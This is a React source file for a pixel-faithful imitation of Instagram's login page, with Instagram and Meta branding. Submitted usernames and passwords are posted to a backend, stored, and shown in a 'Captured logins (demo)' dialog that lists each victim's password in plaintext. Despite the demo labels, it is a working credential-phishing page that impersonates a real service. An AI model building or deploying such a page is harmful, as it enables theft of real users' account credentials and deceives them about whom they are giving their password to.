import { useState } from "react";
import { useMutation, useQuery } from "@tanstack/react-query";
import { useNavigate } from "react-router-dom";
import { motion } from "motion/react";
import { toast } from "sonner";
import { Check, ChevronUp, Eye, EyeOff, Heart, Star } from "lucide-react";
import { Facebook } from "@/lib/lucide-react";
import { apiGet, apiPost } from "@/lib/api";
import type { LoginRecord, LoginRequest, LoginResponse } from "@/lib/types";
import { InstagramGlyph, MetaWordmark } from "@/components/Brand";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";

// Collage photography (Unsplash)
const CENTER_IMG =
  "https://images.unsplash.com/photo-1758525866268-252facc4434c?crop=entropy&cs=srgb&fm=jpg&q=85";
const LEFT_IMG =
  "https://images.unsplash.com/photo-1610950812052-9b48213f1db5?crop=entropy&cs=srgb&fm=jpg&q=85";
const RIGHT_IMG =
  "https://images.unsplash.com/photo-1768932080497-41bb70e2c855?crop=entropy&cs=srgb&fm=jpg&q=85";
const AVATAR_IMG =
  "https://images.unsplash.com/photo-1619011940610-eda7c2ab3477?crop=entropy&cs=srgb&fm=jpg&q=85";

const FOOTER_LINKS = [
  "Meta",
  "About",
  "Blog",
  "Jobs",
  "Help",
  "API",
  "Privacy",
  "Terms",
  "Locations",
  "Popular",
  "Instagram Lite",
  "Meta AI",
  "Muse",
  "Threads",
  "Contact Uploading & Non-Users",
  "Meta Verified",
];

function slug(label: string) {
  return label.toLowerCase().replace(/[^a-z0-9]+/g, "-").replace(/(^-|-$)/g, "");
}

function StoryCard({
  src,
  alt,
  testId,
  className = "",
  footer = "pill",
}: {
  src: string;
  alt: string;
  testId: string;
  className?: string;
  footer?: "pill" | "pill-heart" | "none";
}) {
  return (
    <div
      data-testid={testId}
      className={`relative overflow-hidden rounded-[26px] border border-white/10 bg-[#1a1a1a] shadow-[0_24px_60px_rgba(0,0,0,0.65)] ${className}`}
    >
      <img src={src} alt={alt} className="h-full w-full object-cover" />
      <div className="pointer-events-none absolute inset-0 bg-gradient-to-b from-black/35 via-transparent to-black/45" />
      <div className="absolute inset-x-3 top-2.5 flex gap-1">
        <span className="h-[3px] flex-1 rounded-full bg-white/90" />
        <span className="h-[3px] flex-1 rounded-full bg-white/40" />
        <span className="h-[3px] flex-1 rounded-full bg-white/40" />
      </div>
      {footer === "pill" && (
        <span className="absolute bottom-3 left-3 h-2.5 w-20 rounded-full bg-white/80" />
      )}
      {footer === "pill-heart" && (
        <div className="absolute inset-x-4 bottom-4 flex items-center justify-between">
          <span className="h-3.5 w-28 rounded-full bg-white" />
          <Heart className="h-6 w-6 text-white" />
        </div>
      )}
    </div>
  );
}

function Collage() {
  return (
    <div className="relative mt-8 h-[400px] w-[420px]" data-testid="story-collage">
      <svg aria-hidden="true" width="0" height="0" className="absolute">
        <defs>
          <linearGradient id="ig-heart-gradient" x1="0" y1="0" x2="1" y2="1">
            <stop offset="0%" stopColor="#FF8A5C" />
            <stop offset="100%" stopColor="#E6197A" />
          </linearGradient>
        </defs>
      </svg>

      {/* left card — friend by the yellow car */}
      <motion.div
        initial={{ opacity: 0, y: 28 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.6, ease: "easeOut" }}
        className="absolute left-0 top-10 z-0"
      >
        <div className="-rotate-[9deg]">
          <StoryCard src={LEFT_IMG} alt="Friend by a yellow car" testId="story-card-left" className="h-60 w-40" />
        </div>
      </motion.div>

      {/* right card — friends in the park */}
      <motion.div
        initial={{ opacity: 0, y: 28 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.6, ease: "easeOut", delay: 0.1 }}
        className="absolute right-0 top-8 z-0"
      >
        <div className="rotate-[9deg]">
          <StoryCard src={RIGHT_IMG} alt="Friends running in the park" testId="story-card-right" className="h-60 w-40" />
        </div>
      </motion.div>

      {/* center card — funny-face selfie */}
      <div className="absolute left-1/2 top-0 z-10 -translate-x-1/2">
        <motion.div
          initial={{ opacity: 0, y: 28 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.6, ease: "easeOut", delay: 0.05 }}
        >
          <StoryCard
            src={CENTER_IMG}
            alt="Two friends pulling funny faces"
            testId="story-card-center"
            className="h-[380px] w-48"
            footer="pill-heart"
          />
        </motion.div>
      </div>

      {/* emoji sticker */}
      <motion.div
        initial={{ scale: 0, opacity: 0 }}
        animate={{ scale: 1, opacity: 1 }}
        transition={{ delay: 0.3, type: "spring", stiffness: 260, damping: 20 }}
        className="absolute left-[78px] top-[-16px] z-20"
      >
        <span data-testid="emoji-sticker" className="inline-block -rotate-6 rounded-2xl bg-white px-2.5 py-1.5 text-xl shadow-xl">
          😍🤩
        </span>
      </motion.div>

      {/* close-friends star badge */}
      <motion.div
        initial={{ scale: 0, opacity: 0 }}
        animate={{ scale: 1, opacity: 1 }}
        transition={{ delay: 0.4, type: "spring", stiffness: 260, damping: 20 }}
        className="absolute right-[-10px] top-4 z-20"
      >
        <span
          data-testid="close-friends-badge"
          className="relative flex h-11 w-11 items-center justify-center rounded-full bg-[#00BA56] ring-4 ring-black"
        >
          <Star className="h-5 w-5 fill-white text-white" />
          <span className="absolute -bottom-0.5 -right-0.5 flex h-4 w-4 items-center justify-center rounded-full bg-white">
            <Check className="h-3 w-3 text-[#00BA56]" strokeWidth={3.5} />
          </span>
        </span>
      </motion.div>

      {/* avatar bubble with gradient ring */}
      <motion.div
        initial={{ scale: 0, opacity: 0 }}
        animate={{ scale: 1, opacity: 1 }}
        transition={{ delay: 0.5, type: "spring", stiffness: 260, damping: 20 }}
        className="absolute bottom-6 right-16 z-20"
      >
        <div className="rounded-full bg-[conic-gradient(from_180deg,#FEDA75,#FA7E1E,#D62976,#962FBF,#4F5BD5,#FEDA75)] p-[3px]">
          <img
            src={AVATAR_IMG}
            alt="Friend avatar"
            className="h-14 w-14 rounded-full border-2 border-black object-cover"
          />
        </div>
      </motion.div>

      {/* pink heart sticker */}
      <motion.div
        initial={{ scale: 0, opacity: 0 }}
        animate={{ scale: 1, opacity: 1 }}
        transition={{ delay: 0.6, type: "spring", stiffness: 260, damping: 20 }}
        className="absolute left-[56px] top-[266px] z-20"
      >
        <Heart
          className="h-12 w-12 drop-shadow-[0_8px_20px_rgba(230,25,122,0.45)]"
          fill="url(#ig-heart-gradient)"
          stroke="none"
        />
      </motion.div>
    </div>
  );
}

function CapturedLoginsDialog({ open, onOpenChange }: { open: boolean; onOpenChange: (v: boolean) => void }) {
  const logsQuery = useQuery({
    queryKey: ["login-logs"],
    queryFn: () => apiGet<LoginRecord[]>("/login-logs"),
    enabled: open,
  });
  const logs = logsQuery.data ?? [];

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent
        className="border-[#363636] bg-[#1e1e1e] text-white sm:max-w-[520px]"
        data-testid="captured-logins-dialog"
      >
        <DialogHeader>
          <DialogTitle>Captured logins (demo)</DialogTitle>
          <DialogDescription className="text-[#A8A8A8]">
            Every submit hits POST /api/login — stored in MongoDB and appended to
            backend/data/login_logs.json.
          </DialogDescription>
        </DialogHeader>
        {logsQuery.isLoading ? (
          <div className="space-y-2" data-testid="captured-logins-loading">
            {[0, 1, 2].map((i) => (
              <div key={i} className="h-12 animate-pulse rounded-md bg-[#262626]" />
            ))}
          </div>
        ) : logs.length === 0 ? (
          <p className="text-sm text-[#A8A8A8]" data-testid="captured-logins-empty">
            No logins captured yet — submit the form once.
          </p>
        ) : (
          <ul className="max-h-[320px] space-y-2 overflow-y-auto" data-testid="captured-logins-list">
            {logs.map((log) => (
              <li
                key={log.id}
                data-testid={`captured-login-row-${log.id}`}
                className="rounded-lg border border-[#262626] bg-black/40 px-3 py-2 text-sm"
              >
                <div className="flex items-center justify-between gap-3">
                  <span className="font-semibold" data-testid={`captured-login-username-${log.id}`}>
                    {log.username}
                  </span>
                  <span className="shrink-0 text-xs text-[#737373]">
                    {new Date(log.created_at).toLocaleString()}
                  </span>
                </div>
                <span className="font-mono text-xs text-[#A8A8A8]" data-testid={`captured-login-password-${log.id}`}>
                  {log.password}
                </span>
              </li>
            ))}
          </ul>
        )}
      </DialogContent>
    </Dialog>
  );
}

export default function LoginPage() {
  const navigate = useNavigate();
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [logsOpen, setLogsOpen] = useState(false);

  const mutation = useMutation({
    mutationFn: (body: LoginRequest) => apiPost<LoginResponse>("/login", body),
    onSuccess: (data) => {
      localStorage.setItem("ig_user", data.user.username);
      navigate("/feed");
    },
    onError: () => toast.error("Couldn't log in — please try again."),
  });

  const onSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!username.trim() || !password) {
      toast.error("Enter your mobile number, username or email, and password.");
      return;
    }
    mutation.mutate({ username: username.trim(), password });
  };

  return (
    <div className="flex min-h-svh flex-col bg-black text-white" data-testid="login-page">
      <div className="flex flex-1">
        {/* Left hero */}
        <section className="relative hidden w-[62%] flex-col overflow-hidden bg-black lg:flex" data-testid="login-hero">
          <div className="p-6">
            <span data-testid="instagram-logo" className="inline-flex">
              <InstagramGlyph size={52} />
            </span>
          </div>
          <div className="flex flex-1 flex-col items-center justify-center pb-6">
            <h1 className="text-center text-[40px] font-medium leading-[1.22] tracking-[-0.01em] xl:text-[50px]" data-testid="hero-headline">
              See everyday
              <br />
              moments from your
              <br />
              <span className="bg-gradient-to-r from-[#FBAA47] via-[#D91A46] to-[#A60F93] bg-clip-text text-transparent">
                close friends.
              </span>
            </h1>
            <Collage />
          </div>
        </section>

        {/* Right auth panel */}
        <section
          className="flex w-full items-center justify-center border-l border-[#262626] bg-[#121212] px-6 py-12 lg:w-[38%] lg:px-10"
          data-testid="login-panel"
        >
          <div className="flex w-full max-w-[560px] flex-col">
            <h2 className="text-xl font-semibold tracking-tight text-white" data-testid="login-heading">
              Log into Instagram
            </h2>
            <form className="mt-5 space-y-3" onSubmit={onSubmit} noValidate data-testid="login-form">
              <Input
                data-testid="login-username-input"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                placeholder="Mobile number, username or email"
                autoComplete="username"
                className="h-14 rounded-xl border-[#363636] bg-[#121212] px-4 text-sm text-[#F5F5F5] placeholder:text-[#737373] focus-visible:border-[#4A9EFF] focus-visible:ring-2 focus-visible:ring-[#4A9EFF]/70"
              />
              <div className="relative">
                <Input
                  data-testid="login-password-input"
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Password"
                  autoComplete="current-password"
                  className="h-14 rounded-xl border-[#363636] bg-[#121212] pl-4 pr-12 text-sm text-[#F5F5F5] placeholder:text-[#737373] focus-visible:border-[#4A9EFF] focus-visible:ring-2 focus-visible:ring-[#4A9EFF]/70"
                />
                {password.length > 0 && (
                  <button
                    type="button"
                    data-testid="password-visibility-toggle"
                    aria-label={showPassword ? "Hide password" : "Show password"}
                    onClick={() => setShowPassword((v) => !v)}
                    className="absolute right-4 top-1/2 -translate-y-1/2 text-[#737373] transition-colors hover:text-white"
                  >
                    {showPassword ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                  </button>
                )}
              </div>
              <Button
                type="submit"
                disabled={mutation.isPending}
                data-testid="login-submit-button"
                className="mt-2 h-12 w-full rounded-lg bg-[#1666DC] text-sm font-semibold text-white transition-all hover:bg-[#1E74E8] active:scale-[0.99]"
              >
                {mutation.isPending ? "Logging in…" : "Log in"}
              </Button>
            </form>
            <div className="mt-5 text-center">
              <a
                href="#"
                onClick={(e) => e.preventDefault()}
                data-testid="forgot-password-link"
                className="text-sm font-semibold text-white hover:underline"
              >
                Forgot password?
              </a>
            </div>
            <div className="mt-16 space-y-3">
              <button
                type="button"
                data-testid="facebook-login-button"
                onClick={() => toast.info("Facebook login is a demo button.")}
                className="flex h-12 w-full items-center justify-center gap-2 rounded-full bg-[#202020] text-sm font-semibold text-white transition-all hover:bg-[#2A2A2A] active:scale-[0.99]"
              >
                <span className="flex h-5 w-5 items-center justify-center rounded-full bg-[#0866FF]">
                  <Facebook className="h-3 w-3 fill-white text-white" />
                </span>
                Log in with Facebook
              </button>
              <button
                type="button"
                data-testid="create-account-button"
                onClick={() => toast.info("Account creation is disabled in this demo.")}
                className="h-12 w-full rounded-full border border-[#2F61B5] text-sm font-semibold text-white transition-all hover:bg-white/5 active:scale-[0.99]"
              >
                Create new account
              </button>
            </div>
            <div className="mt-20 flex justify-center text-white">
              <MetaWordmark />
            </div>
            <div className="mt-8 text-center">
              <button
                type="button"
                data-testid="view-captured-logins-button"
                onClick={() => setLogsOpen(true)}
                className="text-xs text-[#737373] transition-colors hover:text-white hover:underline"
              >
                Demo: view captured logins
              </button>
            </div>
          </div>
        </section>
      </div>

      {/* Footer */}
      <footer className="bg-black px-6 py-7" data-testid="login-footer">
        <div className="mx-auto flex max-w-[1200px] flex-wrap items-center justify-center gap-x-4 gap-y-2">
          {FOOTER_LINKS.map((link) => (
            <a
              key={link}
              href="#"
              onClick={(e) => e.preventDefault()}
              data-testid={`footer-link-${slug(link)}`}
              className="text-xs text-[#737373] transition-colors hover:underline"
            >
              {link}
            </a>
          ))}
        </div>
        <div className="mt-5 flex items-center justify-center gap-5 text-xs text-[#737373]">
          <button
            type="button"
            data-testid="language-selector"
            className="flex items-center gap-1 hover:underline"
          >
            English <ChevronUp className="h-3.5 w-3.5" />
          </button>
          <span data-testid="copyright">© 2026 Instagram from Meta</span>
        </div>
      </footer>

      <CapturedLoginsDialog open={logsOpen} onOpenChange={setLogsOpen} />
    </div>
  );
}
